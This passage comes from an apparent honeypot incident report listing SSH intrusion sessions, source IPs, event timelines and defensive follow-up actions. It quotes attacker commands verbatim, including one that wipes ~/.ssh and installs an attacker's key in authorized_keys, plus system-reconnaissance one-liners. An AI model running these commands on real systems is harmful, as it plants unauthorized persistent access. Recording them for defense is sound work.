| `2026-03-09 06:16:51` | `cowrie.session.params` |
| `2026-03-09 06:16:51` | `cowrie.command.input` |
| `2026-03-09 06:16:51` | `cowrie.log.closed` |
| `2026-03-09 06:16:52` | `cowrie.session.params` |
| `2026-03-09 06:16:52` | `cowrie.command.input` |
| `2026-03-09 06:16:53` | `cowrie.log.closed` |
| `2026-03-09 06:16:53` | `cowrie.session.params` |
| `2026-03-09 06:16:53` | `cowrie.command.input` |
| `2026-03-09 06:16:54` | `cowrie.log.closed` |
| `2026-03-09 06:16:54` | `cowrie.session.params` |
| `2026-03-09 06:16:54` | `cowrie.command.input` |
| `2026-03-09 06:16:54` | `cowrie.log.closed` |
| `2026-03-09 06:16:55` | `cowrie.session.params` |
| `2026-03-09 06:16:55` | `cowrie.command.input` |
| `2026-03-09 06:16:55` | `cowrie.log.closed` |
| `2026-03-09 06:16:56` | `cowrie.session.params` |
| `2026-03-09 06:16:56` | `cowrie.command.input` |
| `2026-03-09 06:16:56` | `cowrie.log.closed` |
| `2026-03-09 06:16:57` | `cowrie.session.params` |
| `2026-03-09 06:16:57` | `cowrie.command.input` |
| `2026-03-09 06:16:57` | `cowrie.log.closed` |
| `2026-03-09 06:16:57` | `cowrie.session.params` |
| `2026-03-09 06:16:57` | `cowrie.command.input` |
| `2026-03-09 06:16:58` | `cowrie.log.closed` |
| `2026-03-09 06:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.185.165` to AbuseIPDB if not already reported
- [ ] Block `180.76.185.165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-434fcfa78371

| Field | Detail |
|---|---|
| **Source IP** | `157.15.59.104` |
| **First Seen** | 2026-03-09 06:48 |
| **Last Seen** | 2026-03-09 06:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 06:48:43` | `cowrie.session.connect` |
| `2026-03-09 06:48:43` | `cowrie.client.version` |
| `2026-03-09 06:48:43` | `cowrie.client.kex` |
| `2026-03-09 06:48:43` | `cowrie.login.success` |
| `2026-03-09 06:48:43` | `cowrie.session.params` |
| `2026-03-09 06:48:43` | `cowrie.command.input` |
| `2026-03-09 06:48:43` | `cowrie.command.failed` |
| `2026-03-09 06:48:43` | `cowrie.log.closed` |
| `2026-03-09 06:48:43` | `cowrie.session.params` |
| `2026-03-09 06:48:43` | `cowrie.command.input` |
| `2026-03-09 06:48:43` | `cowrie.session.file_download` |
| `2026-03-09 06:48:43` | `cowrie.log.closed` |
| `2026-03-09 06:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.59.104` to AbuseIPDB if not already reported
- [ ] Block `157.15.59.104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba08c5ff3183

| Field | Detail |
|---|---|
| **Source IP** | `157.15.59.120` |
| **First Seen** | 2026-03-09 06:48 |
| **Last Seen** | 2026-03-09 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 06:48:45` | `cowrie.session.connect` |
| `2026-03-09 06:48:45` | `cowrie.client.version` |
| `2026-03-09 06:48:45` | `cowrie.client.kex` |
| `2026-03-09 06:48:45` | `cowrie.login.success` |
| `2026-03-09 06:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.59.120` to AbuseIPDB if not already reported
- [ ] Block `157.15.59.120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c110052cd5c

| Field | Detail |
|---|---|
| **Source IP** | `170.64.177.28` |
| **First Seen** | 2026-03-09 07:37 |
| **Last Seen** | 2026-03-09 07:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 07:37:06` | `cowrie.session.connect` |
| `2026-03-09 07:37:06` | `cowrie.client.version` |
| `2026-03-09 07:37:06` | `cowrie.client.kex` |
| `2026-03-09 07:37:09` | `cowrie.login.success` |
| `2026-03-09 07:37:10` | `cowrie.session.params` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.command.input` |
| `2026-03-09 07:37:10` | `cowrie.log.closed` |
| `2026-03-09 07:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.177.28` to AbuseIPDB if not already reported
- [ ] Block `170.64.177.28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4765db8cf7a5

| Field | Detail |
|---|---|
| **Source IP** | `170.64.177.28` |
| **First Seen** | 2026-03-09 07:38 |
| **Last Seen** | 2026-03-09 07:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 07:38:20` | `cowrie.session.connect` |
| `2026-03-09 07:38:20` | `cowrie.client.version` |
| `2026-03-09 07:38:20` | `cowrie.client.kex` |
| `2026-03-09 07:38:22` | `cowrie.login.success` |
| `2026-03-09 07:38:24` | `cowrie.session.params` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.command.input` |
| `2026-03-09 07:38:24` | `cowrie.log.closed` |
| `2026-03-09 07:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.64.177.28` to AbuseIPDB if not already reported
- [ ] Block `170.64.177.28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96fa3a929293

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:04 |
| **Last Seen** | 2026-03-09 08:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:04:43` | `cowrie.session.connect` |
| `2026-03-09 08:04:43` | `cowrie.client.version` |
| `2026-03-09 08:04:43` | `cowrie.client.kex` |
| `2026-03-09 08:04:45` | `cowrie.login.success` |
| `2026-03-09 08:04:46` | `cowrie.session.params` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.command.input` |
| `2026-03-09 08:04:46` | `cowrie.log.closed` |
| `2026-03-09 08:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9205b17451

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:05 |
| **Last Seen** | 2026-03-09 08:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:05:28` | `cowrie.session.connect` |
| `2026-03-09 08:05:29` | `cowrie.client.version` |
| `2026-03-09 08:05:29` | `cowrie.client.kex` |
| `2026-03-09 08:05:30` | `cowrie.login.success` |
| `2026-03-09 08:05:31` | `cowrie.session.params` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.command.input` |
| `2026-03-09 08:05:31` | `cowrie.log.closed` |
| `2026-03-09 08:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcbd8c6416b8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.213` |
| **First Seen** | 2026-03-09 08:06 |
| **Last Seen** | 2026-03-09 08:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:06:24` | `cowrie.session.connect` |
| `2026-03-09 08:06:24` | `cowrie.client.version` |
| `2026-03-09 08:06:24` | `cowrie.client.kex` |
| `2026-03-09 08:06:25` | `cowrie.login.success` |
| `2026-03-09 08:06:26` | `cowrie.session.params` |
| `2026-03-09 08:06:26` | `cowrie.command.input` |
| `2026-03-09 08:06:26` | `cowrie.command.failed` |
| `2026-03-09 08:06:26` | `cowrie.log.closed` |
| `2026-03-09 08:06:27` | `cowrie.session.params` |
| `2026-03-09 08:06:27` | `cowrie.command.input` |
| `2026-03-09 08:06:27` | `cowrie.session.file_download` |
| `2026-03-09 08:06:27` | `cowrie.log.closed` |
| `2026-03-09 08:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c23ed1df415

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.213` |
| **First Seen** | 2026-03-09 08:06 |
| **Last Seen** | 2026-03-09 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:06:30` | `cowrie.session.connect` |
| `2026-03-09 08:06:30` | `cowrie.client.version` |
| `2026-03-09 08:06:31` | `cowrie.client.kex` |
| `2026-03-09 08:06:32` | `cowrie.login.success` |
| `2026-03-09 08:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9255855886ce

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:06 |
| **Last Seen** | 2026-03-09 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:06:57` | `cowrie.session.connect` |
| `2026-03-09 08:06:57` | `cowrie.client.version` |
| `2026-03-09 08:06:57` | `cowrie.client.kex` |
| `2026-03-09 08:06:59` | `cowrie.login.success` |
| `2026-03-09 08:06:59` | `cowrie.session.params` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:07:00` | `cowrie.log.closed` |
| `2026-03-09 08:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334a9d293780

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:07 |
| **Last Seen** | 2026-03-09 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:07:40` | `cowrie.session.connect` |
| `2026-03-09 08:07:40` | `cowrie.client.version` |
| `2026-03-09 08:07:40` | `cowrie.client.kex` |
| `2026-03-09 08:07:42` | `cowrie.login.success` |
| `2026-03-09 08:07:43` | `cowrie.session.params` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.log.closed` |
| `2026-03-09 08:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8a979cbee1

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:08 |
| **Last Seen** | 2026-03-09 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:08:27` | `cowrie.session.connect` |
| `2026-03-09 08:08:27` | `cowrie.client.version` |
| `2026-03-09 08:08:27` | `cowrie.client.kex` |
| `2026-03-09 08:08:28` | `cowrie.login.success` |
| `2026-03-09 08:08:28` | `cowrie.session.params` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.log.closed` |
| `2026-03-09 08:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ab477ad308

| Field | Detail |
|---|---|
| **Source IP** | `120.92.15.204` |
| **First Seen** | 2026-03-09 08:22 |
| **Last Seen** | 2026-03-09 08:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:22:58` | `cowrie.session.connect` |
| `2026-03-09 08:22:58` | `cowrie.client.version` |
| `2026-03-09 08:22:58` | `cowrie.client.kex` |
| `2026-03-09 08:22:58` | `cowrie.login.success` |
| `2026-03-09 08:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.92.15.204` to AbuseIPDB if not already reported
- [ ] Block `120.92.15.204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-586f30a57bf9

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202.84` |
| **First Seen** | 2026-03-09 09:15 |
| **Last Seen** | 2026-03-09 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 09:15:17` | `cowrie.session.connect` |
| `2026-03-09 09:15:17` | `cowrie.client.version` |
| `2026-03-09 09:15:17` | `cowrie.client.kex` |
| `2026-03-09 09:15:17` | `cowrie.login.success` |
| `2026-03-09 09:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202.84` to AbuseIPDB if not already reported
- [ ] Block `103.146.202.84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b762a67b46e

| Field | Detail |
|---|---|
| **Source IP** | `178.128.50.27` |
| **First Seen** | 2026-03-09 10:11 |
| **Last Seen** | 2026-03-09 10:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:11:28` | `cowrie.session.connect` |
| `2026-03-09 10:11:28` | `cowrie.client.version` |
| `2026-03-09 10:11:28` | `cowrie.client.kex` |
| `2026-03-09 10:11:29` | `cowrie.login.success` |
| `2026-03-09 10:11:30` | `cowrie.session.params` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.log.closed` |
| `2026-03-09 10:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.50.27` to AbuseIPDB if not already reported
- [ ] Block `178.128.50.27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bc06dbb2a5

| Field | Detail |
|---|---|
| **Source IP** | `178.128.50.27` |
| **First Seen** | 2026-03-09 10:12 |
| **Last Seen** | 2026-03-09 10:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:12:43` | `cowrie.session.connect` |
| `2026-03-09 10:12:43` | `cowrie.client.version` |
| `2026-03-09 10:12:43` | `cowrie.client.kex` |
| `2026-03-09 10:12:44` | `cowrie.login.success` |
| `2026-03-09 10:12:44` | `cowrie.session.params` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.log.closed` |
| `2026-03-09 10:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.50.27` to AbuseIPDB if not already reported
- [ ] Block `178.128.50.27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2733b2cbeed0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.80` |
| **First Seen** | 2026-03-09 10:33 |
| **Last Seen** | 2026-03-09 10:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
